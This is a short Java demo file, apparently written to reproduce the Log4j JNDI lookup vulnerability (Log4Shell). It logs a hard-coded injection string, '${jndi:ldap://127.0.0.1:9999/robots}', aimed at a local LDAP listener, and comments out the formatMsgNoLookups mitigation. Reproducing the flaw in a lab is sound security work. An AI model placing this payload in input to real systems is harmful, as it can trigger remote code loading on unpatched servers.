package bugdemo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @Description:
 * @Author: wangdakai
 * @Date: 2021/12/13
 */
public class Log4jBugTest {
    private static final Logger LOGGER = LogManager.getLogger(Log4jBugTest.class);

    public static void main(String[] args) {
        // 加入前端给你传递的参数是jndi的，且此时你打印了他的参数。
        String params = "${jndi:ldap://127.0.0.1:9999/robots}";

        //log4j2.formatMsgNoLookups=True;
        //-Dlog4j2.formatMsgNoLookups=true

        LOGGER.error("params:{}", params);
    }
}